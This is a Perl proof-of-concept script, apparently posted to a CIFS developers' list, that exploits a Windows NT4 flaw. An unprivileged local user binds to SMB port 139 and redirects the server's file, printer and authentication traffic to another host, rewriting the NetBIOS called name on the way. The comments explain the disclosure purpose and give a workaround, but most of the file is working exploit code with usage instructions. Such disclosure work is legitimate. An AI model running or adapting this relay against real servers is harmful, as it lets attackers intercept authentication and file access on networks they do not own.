#!/usr/bin/perl
# This script demonstrates a major security problem with
# Windows NT4. It is based on an earlier script (paul.pl) that
# demonstrated a problem with a protocol change that Microsoft
# proposed. The change in this script takes advantage of a security
# hole pointed out by L0pht (http://www.l0pht.com/).

# What this script does is allow any unprivileged user on a NT Server
# to redirect the local SMB services to any other SMB server which they
# have an IP address for. This allows the user to redirect file,
# printer and authentication services to another server. This has
# enormous consequences for security.

# This script was written by Andrew Tridgell and is being sent to
# the CIFS discussion list so that CIFS developers become aware
# of this problem. It should be noted that the L0pht announcement
# (which predates this script) already provided an example command
# using netcat to achieve the same thing so this script does
# not actually offer malicious hackers anything more than what has
# already been widely distributed. I wrote this example so that
# the consequences would become clear to the people who are
# in a position to do something about fixing the problem.

# USAGE:
# To use this script install perl5 then run the command
#        perl redirect.pl <localip> <remoteip>
# for example
#        perl redirect.pl 192.168.2.13 192.168.2.10
# this would redirect any SMB connections made to the local
# server (whose IP address is 192.168.2.13) to the remote
# server 192.168.2.10. Any browsing, file access, authentication
# requests or printing done to the local server by SMB clients
# will be redirected to the remote server.

# WORKAROUND:
# There is no immediate fix to this security problem yet available. A
# workaround is to disable local login access to non-trusted users.
# This can be achieved using the "User Manager For Domains". At many
# sites this will be an acceptable solution because NT servers are
# often used only for remote file and printer services and do not
# really need to offer the ability for users to run arbitrary programs

# FIX:
# A proper fix will require a patch from Microsoft. Hopefully they will
# either implement privileged ports or they will get the socket
# options correct on all their servers so such bind() tricks are
# not possible.

use IO::Socket;
use IO::Select;

if ($#ARGV != 1) {
    print "Usage: redirect.pl <localip> <remoteip>\n";
    exit 0;
}

my $local = $ARGV[0];
my $target = $ARGV[1];

my $smbport = "139";
my $Msg;

# this is a *SMBSERVER netbios name
my $netbname = "CKFDENECFDEFFCFGEFFCCACACACACACA";

print "setting up redirection from $local to $target ...\n";
# Create a local socket
$sock1 = new IO::Socket::INET(LocalAddr=>$local,LocalPort=>$smbport,
                              Proto=>'tcp',Listen=>5,Reuse=>1);

while (1) {

print "listening on $local\n";

# Accept a connection
$IS = $sock1->accept() || die;

# Open a socket to the remote host
$OS = new
IO::Socket::INET(PeerAddr=>$target,PeerPort=>$smbport,Proto=>'tcp') ||
die;

print "connected to $target\n";

# Create a read set for select()
$rs = new IO::Select();
$rs->add($IS,$OS);

$first = 1;
$finished = 0;

while(! $finished) {
    ($r_ready) = IO::Select->select($rs,undef,undef,undef);

    foreach $i (@$r_ready) {
        $o = $OS if $i == $IS;
        $o = $IS if $i == $OS;

        recv($i,$Msg,8192,0);
        if (! length $Msg) {
            $finished = 1;
            break;
        }

        if ($first && substr($Msg,0,1) eq "\x81") {
            print "replacing called name\n";
            $msg2 =
join('',substr($Msg,0,5),$netbname,substr($Msg,37,length($Msg)-37));
            send($o,$msg2,0);
            $first = 0;
        } else {
            if ($i == $OS) { $Msg =~ s/Paul/Oops/mg;}
            send($o,$Msg,0);
        }
    }
}
# loop back to the top again
}

